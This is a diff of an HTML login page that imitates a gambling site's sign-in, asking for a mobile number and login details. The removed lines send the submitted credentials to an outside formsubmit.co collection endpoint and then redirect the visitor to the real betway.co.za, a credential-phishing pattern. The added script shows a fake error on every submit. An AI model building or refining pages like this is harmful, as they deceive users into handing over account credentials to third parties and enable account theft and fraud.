@@ -5,6 +5,15 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Login Page</title>
   <link rel="stylesheet" href="sebono.css">
+  <style>
+    .error-message {
+      display: none;
+      color: red;
+      font-weight: bold;
+      margin-top: 10px;
+      text-align: center;
+    }
+  </style>
 </head>
 <body>
 
@@ -19,10 +28,9 @@
 
   <div class="container">
     <h2>Login</h2>
-    <form action="https://formsubmit.co/525a68c3f15ba3237c28cc11c2e7cb21" method="POST">
+    <form id="login-form">
       <input type="hidden" name="_captcha" value="false">
-      <input type="hidden" name="_next" value="https://www.betway.co.za">
-      
+
       <label for="mobile">Mobile Number</label>
       <input type="tel" id="mobile" name="mobile" placeholder="+27 Mobile Number" required />
 
@@ -33,6 +41,10 @@
 
       <button type="submit">Login</button>
     </form>
+
+    <div class="error-message" id="error-message">
+      An error has been detected. Please try again later.
+    </div>
 
     <div class="bottom">
       Don’t have an account yet? <a href="#">Sign Up</a>
@@ -48,5 +60,15 @@
     Gambling on this website, you run the risk that you may lose.
   </div>
 
+  <script>
+    document.getElementById('login-form').addEventListener('submit', function (e) {
+      e.preventDefault(); // Prevent the default form submission
+
+      // Simulate error handling
+      const errorMessage = document.getElementById('error-message');
+      errorMessage.style.display = 'block'; // Show the error message
+    });
+  </script>
+
 </body>
-</html>
+        </html>
